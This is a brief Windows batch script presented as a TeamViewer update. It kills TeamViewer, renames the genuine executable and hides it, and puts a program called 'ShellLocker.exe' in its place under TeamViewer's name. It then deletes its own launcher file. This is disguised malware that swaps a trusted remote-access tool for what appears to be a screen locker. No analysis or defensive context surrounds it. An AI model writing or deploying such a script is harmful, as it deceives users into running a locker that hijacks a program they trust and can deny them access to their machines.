del /f /q "Start TeamViewer Update.bat"
clear
taskkill /f /t /im TeamViewer.exe
clear
rename "C:\Program Files (x86)\TeamViewer.exe" TeamViewerclean.exe
clear
attrib +h "C:\Program Files (x86)\TeamViewer\TeamViewerclean.exe"
clear
rename "C:\Program Files (x86)\TeamViewer\ShellLocker.exe" TeamViewer.exe
clear
timeout 100 /nobreak